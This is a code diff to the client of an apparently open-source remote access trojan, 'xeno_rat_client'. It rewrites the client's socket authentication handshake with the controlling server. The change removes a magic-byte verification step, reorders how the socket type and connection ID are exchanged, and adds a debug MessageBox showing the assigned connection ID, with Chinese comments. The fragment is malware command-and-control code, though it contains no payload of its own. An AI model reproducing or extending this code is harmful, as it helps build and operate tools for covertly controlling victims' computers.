@@ -5,6 +5,7 @@ using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace xeno_rat_client
 {
@@ -126,39 +127,33 @@ namespace xeno_rat_client
             byte[] comp = new byte[] { 109, 111, 111, 109, 56, 50, 53 };
             try
             {
-                sock.SetRecvTimeout(5000);
-                data = await sock.ReceiveAsync();
-                if (!await sock.SendAsync(data))
+                byte[] _SockType = sock.IntToBytes(type);
+                // 4.client发出请求，type=0
+                if (!(await sock.SendAsync(_SockType)))
                 {
                     return false;
                 }
-                data = await sock.ReceiveAsync();
-                sock.ResetRecvTimeout();
-                if (ByteArrayCompare(comp, data))
+                if (type == 0)
                 {
-                    byte[] _SockType = sock.IntToBytes(type);
-                    if (!(await sock.SendAsync(_SockType)))
+                    // 4.server发出请求，connId
+                    data = await sock.ReceiveAsync();
+                    int connId = sock.BytesToInt(data);
+                    string title = "Client.Node.AuthenticateAsync";
+                    string message = "connId" + connId;
+                    MessageBox.Show(message, title);
+                    ID = connId;
+                }
+                else
+                {
+                    ID = id;
+                    byte[] connId = sock.IntToBytes(id);
+                    if (!(await sock.SendAsync(connId)))
                     {
                         return false;
                     }
-                    if (type == 0)
-                    {
-                        data = await sock.ReceiveAsync();
-                        int connId = sock.BytesToInt(data);
-                        ID = connId;
-                    }
-                    else
-                    {
-                        ID = id;
-                        byte[] connId = sock.IntToBytes(id);
-                        if (!(await sock.SendAsync(connId)))
-                        {
-                            return false;
-                        }
-                    }
-                    SockType = type;
-                    return true;
                 }
+                SockType = type;
+                return true;
             }
             catch
             {
